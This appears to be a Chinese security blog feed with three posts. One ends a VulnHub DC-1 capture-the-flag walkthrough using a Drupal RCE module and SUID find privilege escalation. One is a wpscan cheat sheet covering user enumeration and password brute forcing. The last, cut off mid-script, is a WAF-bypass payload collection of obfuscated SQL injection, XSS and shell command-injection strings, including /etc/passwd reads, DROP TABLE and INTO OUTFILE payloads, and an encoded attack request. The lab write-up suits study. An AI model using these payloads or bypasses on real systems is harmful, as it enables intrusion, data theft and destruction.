<h2 id="0x07-成功获得flag1-txt"><a href="#0x07-成功获得flag1-txt" class="headerlink" title="0x07 成功获得flag1.txt"></a>0x07 成功获得flag1.txt</h2><p>那就尝试其他漏洞吧，看大佬们博客，说是可以利用RCE，那就试试。</p>
<p>上msf</p>
<p>直接搜索Drupal</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>

<img src="https://ckcah.github.io/images/DC_1/13.png">

<p>然后尝试了前面几个，第二个可以使用</p>
<img src="https://ckcah.github.io/images/DC_1/14.png">

<p>成功获得权限</p>
<img src="https://ckcah.github.io/images/DC_1/15.png">

<p>直接查看到了flag1.txt</p>
<img src="https://ckcah.github.io/images/DC_1/16.png">

<p>flag1.txt到手</p>
<p>然后逛了一下，好像没什么东西，进shell看看</p>
<p>python -c ‘import pty;pty.spawn(“/bin/sh”)</p>
<img src="https://ckcah.github.io/images/DC_1/17.png">



<h2 id="0x08-flag2"><a href="#0x08-flag2" class="headerlink" title="0x08 flag2"></a>0x08 flag2</h2><p>既然进来了，肯定免不了看看数据库撒</p>
<p>看了哈INSTALL文件，好像没什么有用的，但INSTALL.txt文件提到了settings.php</p>
<img src="https://ckcah.github.io/images/DC_1/18.png">

<p>查看settings.php</p>
<img src="https://ckcah.github.io/images/DC_1/19.png">

<p>看到了flag2</p>
<h2 id="0x09-flag3"><a href="#0x09-flag3" class="headerlink" title="0x09 flag3"></a>0x09 flag3</h2><p>flag2的下边已经给出了关于mysql的提示，猜测flag3在数据库里面</p>
<p>直接登录mysql</p>
<img src="https://ckcah.github.io/images/DC_1/20.png">

<p>然后，，，，直接查看到users表，</p>
<img src="https://ckcah.github.io/images/DC_1/21.png">

<p>哈希加密了。我再看看其他表</p>
<img src="https://ckcah.github.io/images/DC_1/22.png">

<p>那反正意思就是应该是在后台里面了。</p>
<p>之前看到了users表，是哈希加密，那就尝试解密。</p>
<p>额，，，，，尝试以后发现我解不出来。</p>
<p>那就重置密码吧。</p>
<p>当我要登录的时候，，，，</p>
<img src="https://ckcah.github.io/images/DC_1/23.png">

<p>我，，，，emmm，没办法，flag3后期尝试吧。</p>
<h3 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h3><p>待续。。。</p>
<h2 id="0x0a-flag4"><a href="#0x0a-flag4" class="headerlink" title="0x0a flag4"></a>0x0a flag4</h2><p>之前进入shell的时候，我就特地的看了一下/etc/passwd,发现了里面有flag4的线索。</p>
<img src="https://ckcah.github.io/images/DC_1/24.png">

<p>直接查看flag4.txt</p>
<img src="https://ckcah.github.io/images/DC_1/25.png">

<h2 id="0x0b-flag5"><a href="#0x0b-flag5" class="headerlink" title="0x0b flag5"></a>0x0b flag5</h2><p>上边flag4里面已经提示，关于另一个flag，大概是说，用相同的方法查看root下边的那个。</p>
<p>大概就是提权吧。</p>
<p>学到了一个新的知识点:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">sudo常用参数：</span><br><span class="line">   -l : 登录用户下面，执行sudo -l 显示当前用户有哪些权限</span><br><span class="line">   -k ：删除/var/db/sudo/下面对应的时间戳的信息，下次执行sudo需要输入当前用户的密码</span><br><span class="line">        --&gt; 系统默认也是5分钟失效</span><br><span class="line">        --&gt; 配置免密是另一种情况 NOPASSWD: ALL远程sudo(有条件限制的)</span><br></pre></td></tr></table></figure>

<p>but，并没有</p>
<img src="https://ckcah.github.io/images/DC_1/26.png">

<p>试试其他的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-type 按类型进行查找，d查找目录，f查找文件</span><br><span class="line"></span><br><span class="line">find . –type d –name [document]</span><br><span class="line"></span><br><span class="line">find . type f –name [filename]</span><br><span class="line"></span><br><span class="line">2&gt;/dev/null</span><br><span class="line"> 意思就是把错误输出到“黑洞”</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>接下来，我就不知道怎么办了，所以参考了网上大佬们的博客。</p>
<p>大概思路：</p>
<p>1.先查看flag4的权限</p>
<img src="https://ckcah.github.io/images/DC_1/27.png">

<p>2.然后借用参数直接提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find flag4.txt -exec &quot;/bin/sh&quot; \;# </span><br></pre></td></tr></table></figure>

<p>这段命令的意思就是先使用 find 命令查找flag4.txt 文件，然后使用它的参数 -exec 来执行命令 /bin/sh ，这样就能获取到 root权限了！</p>
<img src="https://ckcah.github.io/images/DC_1/28.png"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>渗透测试</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>wpscan</title>
    <url>/2020/05/02/wpscan/</url>
    <content><![CDATA[<ol>
<li>常见语法：<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.target.com">www.target.com</a> –enumerate p    #扫描插件基本信息<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.xxx.com">www.xxx.com</a> –enumerate vp    #扫描容易受攻击的插件<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.xxx.com">www.xxx.com</a> –enumerate ap    #扫描所有插件<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.target.com">www.target.com</a> –enumerate u       #暴力枚举用户名<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> –wordlist E:\dic\passX.txt –username admin   #通过用户名爆破密码<br>wpscan –url <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> –wordlist darkc0de.lst –threads 50    #使用字典调用50个线程进行暴力破解<br>wpscan –help<br>wpscan –random-agent  有些网站需要带着浏览器头访问</li>
</ol>
<p>参数选项<br> –update                           更新数据库<br> –url       | -u <target url>      配置扫描URL<br> –force     | -f                   强制让wpscan不要验证目标是否是wordpress<br> –enumerate | -e [option(s)]       枚举信息<br> 选项:<br> u                              枚举用户名，默认从1-10<br> u[10-20]                       枚举用户名，配置从10-20<br> p                              枚举插件<br> vp                             只枚举有漏洞的插件<br> ap                             枚举所有插件，时间较长<br> tt                             列举缩略图相关的文件<br> t                              枚举主题信息<br> vt                             只枚举存在漏洞的主题<br> at                             枚举所有主题，时间较长<br> 可以指定多个扫描选项，例：”-e tt,p”<br> 如果没有指定选项，默认选项为：”vt,tt,u,vp”</target></p>
<p>–exclude-content-based “<regexp or string>“<br> 当使用枚举选项时，可以使用该参数做一些过滤，基于正则或者字符串，可以不写正则分隔符，但要用单引号或双引号包裹<br> –config-file  | -c <config file>   使用指定的配置文件<br> –user-agent   | -a <User-Agent>    指定User-Agent<br> –cookie <String>                   指定cookie<br> –random-agent | -r                 使用随机User-Agent<br> –follow-redirection                如果目标包含一个重定向，则直接跟随跳转<br> –batch                             无需用户交互，都使用默认行为<br> –no-color                          不要采用彩色输出<br> –wp-content-dir <wp content dir>   WPScan会去发现wp-content目录，用户可手动指定<br> –wp-plugins-dir <wp plugins dir>   指定wp插件目录，默认是wp-content/plugins<br> –proxy &lt;[protocol://]host:port&gt;    设置一个代理，可以使用HTTP、SOCKS4、SOCKS4A、SOCKS5，如果未设置默认是HTTP协议<br> –proxy-auth <a href="username:password">username:password</a>    设置代理登陆信息<br> –basic-auth <a href="username:password">username:password</a>    设置基础认证信息<br> –wordlist | -w <wordlist>          指定密码字典<br> –username | -U <username>          指定爆破的用户名<br> –usernames     <path-to-file>      指定爆破用户名字典<br> –threads  | -t <number of threads> 指定多线程<br> –cache-ttl       <cache-ttl>       设置 cache TTL.<br> –request-timeout <request-timeout> 请求超时时间<br> –connect-timeout <connect-timeout> 连接超时时间<br> –max-threads     <max-threads>     最大线程数<br> –throttle        <milliseconds>    当线程数设置为1时，设置两个请求之间的间隔<br> –help     | -h                     输出帮助信息<br> –verbose  | -v                     输出Verbose<br> –version                           输出当前版本</milliseconds></max-threads></connect-timeout></request-timeout></cache-ttl></number></path-to-file></username></wordlist></wp></wp></String></User-Agent></config></regexp></p>
<p>常用选项</p>
<h1 id="非入侵式检测"><a href="#非入侵式检测" class="headerlink" title="非入侵式检测"></a>非入侵式检测</h1><p>wpscan -u <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a></p>
<h1 id="默认选项枚举信息"><a href="#默认选项枚举信息" class="headerlink" title="默认选项枚举信息"></a>默认选项枚举信息</h1><p>wpscan -u <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> -e</p>
<h1 id="枚举插件信息"><a href="#枚举插件信息" class="headerlink" title="枚举插件信息"></a>枚举插件信息</h1><p>wpscan -u <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> -e p</p>
<h1 id="爆破用户名admin的密码"><a href="#爆破用户名admin的密码" class="headerlink" title="爆破用户名admin的密码"></a>爆破用户名admin的密码</h1><p>wpscan -u <a href="https://link.jianshu.com/?t=http://www.example.com">www.example.com</a> –wordlist darkc0de.lst –username admin –threads 50<br> 安全加固</p>
<p>如何避免WordPress用户被枚举</p>
<p>枚举用户的原理，<a href="https://link.jianshu.com/?t=http://www.example.com/?author=1">http://www.example.com/?author=1</a>，替换后面的数字即可枚举用户<br> 如果你想要避免WordPress用户列表被列举，不要把用户名作为昵称，并且不要使用已经被大众知道的用户名。最好的方式是选择一个包含随机字符的名字做用户名并且使用其他名字作为昵称。WPScan扫描URL来获取用户名，所以如果你不使用这个用户名，你肯定不会被WPScan搜索到。</p>
<p>功能如何避免WordPress密码被暴力破解</p>
<p>最好的方式避免暴力破解就是限制登录次数和IP地址。最新版本的WordPress默认有这个选项。确保你限制输入条目最大为3，增加锁定功能（即6次密码尝试就上锁）。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>waf-study</title>
    <url>/2020/05/02/waf-study-1/</url>
    <content><![CDATA[<h3 id="0X00-Fuzz-爆破"><a href="#0X00-Fuzz-爆破" class="headerlink" title="0X00  Fuzz/爆破"></a><strong>0X00  Fuzz/爆破</strong></h3><p><strong>fuzz字典</strong></p>
<p><strong>1.Seclists/Fuzzing</strong></p>
<p><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing</a></p>
<p><strong>2.Fuzz-DB/Attack</strong></p>
<p><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></p>
<p><strong>3.Other Payloads 可能会被ban ip，小心为妙。</strong></p>
<p><a href="https://github.com/foospidy/payloads">https://github.com/foospidy/payloads</a></p>
<h3 id="0X01-正则绕过"><a href="#0X01-正则绕过" class="headerlink" title="0X01  正则绕过"></a><strong>0X01  正则绕过</strong></h3><p>多少waf 使用正则匹配。</p>
<h4 id="黑名单检测-bypass"><a href="#黑名单检测-bypass" class="headerlink" title="黑名单检测/bypass"></a>黑名单检测/bypass</h4><p><strong>Case</strong>: SQL 注入</p>
<h5 id="•-Step-1"><a href="#•-Step-1" class="headerlink" title="• Step 1:"></a>• Step 1:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union</span><br><span class="line">可能正则: preg_match(&#x27;/(and|or|union)/i&#x27;, $id)</span><br><span class="line">被拦截的语句: union select user, password from users</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where</span><br><span class="line">被拦截的语句: 1 || (select user from users where user_id = 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users limit 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 3:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit</span><br><span class="line">被拦截的语句: 1 || (select user from users limit 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 4:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by</span><br><span class="line">被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = &#x27;admin&#x27;</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br></pre></td></tr></table></figure>

<p>• Step 5:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select</span><br><span class="line"></span><br><span class="line">被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || 1 = 1 into outfile &#x27;result.txt&#x27;</span><br><span class="line">bypass语句: 1 || substr(user,1,1) = &#x27;a&#x27;</span><br></pre></td></tr></table></figure>

<p>• Step 6:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;</span><br><span class="line"></span><br><span class="line">被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || user_id is not null</span><br><span class="line">bypass语句: 1 || substr(user,1,1) = 0x61</span><br><span class="line">bypass语句: 1 || substr(user,1,1) = unhex(61)</span><br></pre></td></tr></table></figure>

<p>• Step 7:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;, hex</span><br><span class="line">被拦截的语句: 1 || substr(user,1,1) = unhex(61)</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br></pre></td></tr></table></figure>

<p>• Step 8:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;, hex, substr</span><br><span class="line">被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line"></span><br><span class="line">bypass语句: 1 || lpad(user,7,1)</span><br></pre></td></tr></table></figure>

<p>• Step 9:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤关键词: and, or, union, where, limit, group by, select, &#x27;, hex, substr, white space</span><br><span class="line">被拦截的语句: 1 || lpad(user,7,1)</span><br><span class="line"></span><br><span class="line">bypass语句: 1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure>

<h3 id="0X02-混淆-编码"><a href="#0X02-混淆-编码" class="headerlink" title="0X02    混淆/编码"></a><strong>0X02    混淆/编码</strong></h3><p><strong>1. 大小写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">Bypassed: &lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</span><br><span class="line"></span><br><span class="line">标准: SELECT * FROM all_tables WHERE OWNER = &#x27;DATABASE_NAME&#x27;</span><br><span class="line">Bypassed: sELecT * FrOm all_tables whERe OWNER = &#x27;DATABASE_NAME&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>2. URL 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">被阻断语句: &lt;svG/x=&quot;&gt;&quot;/oNloaD=confirm()//</span><br><span class="line">Bypassed: %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</span><br><span class="line"></span><br><span class="line">被阻断语句: uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</span><br><span class="line">Bypassed: uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</span><br></pre></td></tr></table></figure>

<p><strong>3. Unicode 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准: &lt;marquee onstart=prompt()&gt;</span><br><span class="line">混淆: &lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;</span><br><span class="line"></span><br><span class="line">被阻断语句: /?redir=http://google.com</span><br><span class="line">Bypassed: /?redir=http://google。com (Unicode 替代)</span><br><span class="line"></span><br><span class="line">被阻断语句: &lt;marquee loop=1 onfinish=alert()&gt;x</span><br><span class="line">Bypassed: ＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode 替代)</span><br><span class="line"></span><br><span class="line">TIP: 查看这些说明 this and this reports on HackerOne. :)</span><br></pre></td></tr></table></figure>

<p><strong>4. HTML 实体编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准: &quot;&gt;&lt;img src=x onerror=confirm()&gt;</span><br><span class="line">Encoded: &amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; (General form)</span><br><span class="line">Encoded: &amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</span><br></pre></td></tr></table></figure>

<p><strong>5. 混合编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sometimes, WAF rules often tend to filter out a specific type of encoding.</span><br><span class="line"></span><br><span class="line">This type of filters can be bypassed by mixed encoding payloads.</span><br><span class="line"></span><br><span class="line">Tabs and newlines further add to obfuscation.</span><br></pre></td></tr></table></figure>

<p><strong>混淆</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;A HREF=&quot;h</span><br><span class="line">tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure>

<p><strong>7. 双重URL编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个需要服务端多次解析了url编码</span><br><span class="line"></span><br><span class="line">标准: http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</span><br><span class="line">混淆: http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</span><br><span class="line"></span><br><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">混淆: %253Cscript%253Ealert()%253C%252Fscript%253E</span><br></pre></td></tr></table></figure>

<p><strong>8. 通配符使用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于linux命令语句注入，通过shell通配符绕过</span><br><span class="line"></span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: /???/??t /???/??ss??</span><br><span class="line">Used chars: / ? t s</span><br><span class="line"></span><br><span class="line">标准: /bin/nc 127.0.0.1 1337</span><br><span class="line">混淆: /???/n? 2130706433 1337</span><br><span class="line">Used chars: / ? n [0-9]</span><br></pre></td></tr></table></figure>

<p><strong>9. 动态payload 生成</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">混淆: &lt;script&gt;eval(&#x27;al&#x27;+&#x27;er&#x27;+&#x27;t()&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: /bi&#x27;n&#x27;&#x27;&#x27;/c&#x27;&#x27;at&#x27; /e&#x27;tc&#x27;/pa&#x27;&#x27;ss&#x27;wd</span><br><span class="line"></span><br><span class="line">Bash allows path concatenation for execution.</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;javascript:alert()&quot;&#x27;;&gt;</span><br><span class="line">混淆: &lt;iframe/onload=&#x27;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:al&quot;+&quot;er&quot;+&quot;t()&quot;&#x27;;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>9. 垃圾字符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Normal payloads get filtered out easily.</span><br><span class="line">Adding some junk chars helps avoid detection (specific cases only).</span><br><span class="line">They often help in confusing regex based firewalls.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">标准: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line">混淆: &lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">标准: &lt;BODY onload=alert()&gt;</span><br><span class="line">混淆: &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert()&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>NOTE:</strong> 上述语句可能会破坏正则的匹配，达到绕过。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标准: &lt;a href=javascript;alert()&gt;ClickMe</span><br><span class="line">Bypassed: &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</span><br></pre></td></tr></table></figure>

<p><strong>10. 插入换行符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">部分waf可能会对换行符没有匹配</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe src=javascript:confirm(0)&quot;&gt;</span><br><span class="line">混淆: &lt;iframe src=&quot;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>11. 未定义变量</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash 和 perl 执行脚本中加入未定义变量，干扰正则。</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>TIP:</strong> 随便写个不存在的变量就好。<code>$aaaa,$sdayuhjbsad,$dad2ed</code>都可以。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Level 1 Obfuscation: Normal</span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: /bin/cat$u /etc/passwd$u</span><br><span class="line"></span><br><span class="line">Level 2 Obfuscation: Postion Based</span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: $u/bin$u/cat$u $u/etc$u/passwd$u</span><br><span class="line"></span><br><span class="line">Level 3 Obfuscation: Random characters</span><br><span class="line">标准: /bin/cat /etc/passwd</span><br><span class="line">混淆: $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff</span><br><span class="line"></span><br><span class="line">一个精心制作的payload</span><br><span class="line"></span><br><span class="line">$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf</span><br></pre></td></tr></table></figure>

<p><strong>12. Tab 键和换行符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大多数waf匹配的是空格不是Tab</span><br><span class="line"></span><br><span class="line">标准: &lt;IMG SRC=&quot;javascript:alert();&quot;&gt;</span><br><span class="line">Bypassed: &lt;IMG SRC=&quot; javascript:alert();&quot;&gt;</span><br><span class="line">变形: &lt;IMG SRC=&quot; jav ascri pt:alert ();&quot;&gt;</span><br><span class="line"></span><br><span class="line">标准: http://test.com/test?id=1 union select 1,2,3</span><br><span class="line">标准: http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3</span><br><span class="line"></span><br><span class="line">标准: &lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">混淆:</span><br><span class="line"></span><br><span class="line">&lt;iframe    src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>13. Token Breakers(翻译不了 看起来说的就是sql注入闭合)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.</span><br><span class="line">Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.</span><br><span class="line">However, the request must still remain valid while using token-breakers.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Case: Unknown Token for the Tokenizer</span><br><span class="line"></span><br><span class="line">Payload: ?id=‘-sqlite_version() UNION SELECT password FROM users --</span><br><span class="line"></span><br><span class="line">Case: Unknown Context for the Parser (Notice the uncontexted bracket)</span><br><span class="line"></span><br><span class="line">Payload 1: ?id=123);DROP TABLE users --</span><br><span class="line"></span><br><span class="line">Payload 2: ?id=1337) INTO OUTFILE ‘xxx’ --</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>TIP:</strong> 更多payload可以看这里 cheat sheet.</p>
</blockquote>
<p><strong>14. 其他格式混淆</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">许多web应用程序支持不同的编码类型(如下表)</span><br><span class="line"></span><br><span class="line">混淆成服务器可解析、waf不可解析的编码类型</span><br></pre></td></tr></table></figure>

<p><strong>Case:</strong> IIS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS6, 7.5, 8 and 10 (ASPX v4.x) 允许 IBM037 字符</span><br><span class="line"></span><br><span class="line">可以发送编码后的参数名和值</span><br></pre></td></tr></table></figure>

<p>原始请求:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /sample.aspx?id1=something HTTP/1.1</span><br><span class="line">HOST: victim.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">id2=&#x27;union all select * from users--</span><br></pre></td></tr></table></figure>



<p>混淆请求 + URL Encoding:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1</span><br><span class="line">HOST: victim.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=ibm037</span><br><span class="line">Content-Length: 115</span><br><span class="line"></span><br><span class="line">%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>TIP:</strong> 可以使用 这个小脚本 来转化编码</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib.parse, sys</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line">lackofart = &#x27;&#x27;&#x27;</span><br><span class="line">        OBFUSCATOR</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def paramEncode(params=&quot;&quot;, charset=&quot;&quot;, encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    equalSign = &quot;=&quot;</span><br><span class="line">    ampersand = &quot;&amp;&quot;</span><br><span class="line">    if &#x27;=&#x27; and &#x27;&amp;&#x27; in params:</span><br><span class="line">        if encodeEqualSign:</span><br><span class="line">            equalSign = equalSign.encode(charset)</span><br><span class="line">        if encodeAmpersand:</span><br><span class="line">            ampersand = ampersand.encode(charset)</span><br><span class="line">        params_list = params.split(&quot;&amp;&quot;)</span><br><span class="line">        for param_pair in params_list:</span><br><span class="line">            param, value = param_pair.split(&quot;=&quot;)</span><br><span class="line">            if urlDecodeInput:</span><br><span class="line">                param = urllib.parse.unquote(param)</span><br><span class="line">                value = urllib.parse.unquote(value)</span><br><span class="line">            param = param.encode(charset)</span><br><span class="line">            value = value.encode(charset)</span><br><span class="line">            if urlEncodeOutput:</span><br><span class="line">                param = urllib.parse.quote_plus(param)</span><br><span class="line">                value = urllib.parse.quote_plus(value)</span><br><span class="line">            if result:</span><br><span class="line">                result += ampersand</span><br><span class="line">            result += param + equalSign + value</span><br><span class="line">    else:</span><br><span class="line">        if urlDecodeInput:</span><br><span class="line">            params = urllib.parse.unquote(params)</span><br><span class="line">        result = params.encode(charset)</span><br><span class="line">        if urlEncodeOutput:</span><br><span class="line">            result = urllib.parse.quote_plus(result)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(lackofart)</span><br><span class="line">    parser = ArgumentParser(&#x27;python3 obfu.py&#x27;)</span><br><span class="line">    